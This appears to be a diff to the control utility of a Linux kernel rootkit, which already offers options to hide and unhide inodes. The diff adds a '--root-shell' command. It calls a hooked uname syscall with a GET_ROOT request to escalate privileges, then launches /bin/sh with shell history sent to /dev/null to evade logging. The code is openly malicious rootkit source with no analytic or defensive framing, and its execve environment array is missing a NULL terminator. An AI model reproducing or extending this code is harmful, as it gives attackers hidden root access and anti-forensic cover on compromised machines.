@@ -11,6 +11,7 @@ static struct option long_options[] = {
 	{"hide-inode", 1, 0, 0},
 	{"unhide-inode", 1, 0, 1},
 	{"lulz-mode", 1, 0, 2},
+	{"root-shell", 0, 0, 3},
 	{0, 0, 0, 0}
 };
 
@@ -19,7 +20,21 @@ void usage(const char *path)
 	printf("%s [options]\n" \
 		"\t--hide-inode <inode>\thide inode\n" \
 		"\t--unhide-inode <inode>\tunhide inode\n" \
-		"\t--lulz-mode <on|off>\tactivate lulz mode\n", path);
+		"\t--lulz-mode <on|off>\tactivate lulz mode\n" \
+		"\t--root-shell\t\tgive a root shell\n", path);
+}
+
+void root_shell(void)
+{
+	struct rk_args args;
+	char *argv[] = { "/bin/sh", NULL };
+	char *env[] = { "BASH_HISTORY=/dev/null", "HISTORY=/dev/null",
+			"history=/dev/null" };
+
+	memset(&args, 0, sizeof(args));
+	args.mode = GET_ROOT;
+	syscall(SYS_uname, &args);
+	execve(argv[0], argv, env);
 }
 
 int main(int argc, char **argv)
@@ -59,6 +74,9 @@ int main(int argc, char **argv)
 			}
 
 			syscall(SYS_uname, &args);
+			break;
+		case 3:
+			root_shell();
 			break;
 		default:
 			break;
